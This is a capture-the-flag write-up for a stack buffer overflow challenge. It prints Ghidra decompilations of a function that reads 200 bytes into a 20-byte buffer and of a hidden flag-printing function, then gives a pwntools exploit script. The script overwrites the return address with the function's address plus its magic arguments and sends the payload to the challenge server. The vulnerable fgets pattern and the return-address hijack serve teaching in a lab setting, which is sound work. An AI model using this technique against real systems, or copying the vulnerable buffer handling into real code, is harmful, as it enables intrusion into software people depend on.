# Summary
For this challenge we have another stack overflow challenge, this time focuseing on calling other functions no setup from the stack. The tools for this challenge will be Ghidra to view and understand the code, and pwntools to execute the payload we will create on the remote server.

# Info Gathering
On the first look through the code in Ghidra, we see a function called huh_whats_this_function_for, which prints out the flag from a text file. We see no call to this function in the basic run of the program, meaning we have to spoof the call somehow with stack overflow. Looking trhough the code we see a function called breakfast, which we can actually overflow. Local_24 is our target in this case, and looking at the stack we see we have a offset of 0x24, which is equal to 36. Meaning we have to give 36 bytes of junk to get to the rest of the stack.
```
void huh_whats_this_function_for(int param_1,int param_2)

{
  char local_33 [35];
  FILE *local_10;
  
  if ((param_1 == -0x74520ff3) && (param_2 == -0x54524542)) {
    printf("Here is the correct flag: ");
    local_10 = fopen("flag.txt","r");
    fgets(local_33,0x22,local_10);
    fclose(local_10);
    puts(local_33);
  }
  return;
}
```
```
void breakfast(void)

{
  char local_24 [20]; #value to overflow
  int local_10;
  
  puts("What breakfast do you want to eat?");
  do {
    local_10 = getchar();
    if (local_10 == 10) break;
  } while (local_10 != -1);
  fgets(local_24,200,stdin); #grabs more than necessary
  puts("I guess if thats what u want...");
  return;
}

```
# Payload Creation
With the knowledge of the overflow above we can begin creating a payload with pwn tools. First things first we get to to the breakfast function in the remote server. From there we fill up 36 bytes of junk to get to return address. Here we fill in the return address for the flag printing function. Then we add another garbage return address so that after the flag function runs it can find a function to continue to(doesn't matter since we just need the flag and don't need the program to continue afterwards). After those two address, we have to pass in the variables for the function run, with inputting param_1 first then param_2 since the stack is reversed with variables.

```python
from pwn import *

p = remote("chal.ctf-league.osusec.org", 7159)
p.recv()
p.recv()
p.sendline("1")
p.recv()
p.recv()
p.sednline("2")
p.recvline()
p.sendline((b'A'*36) + p32(0x08048646) + p32(0) + p32(0x8badf00d) + p32(0xabadbabe))
p.interactive()
```

When this script is run it will print out the flag to our terminal, then we can submit it for points. 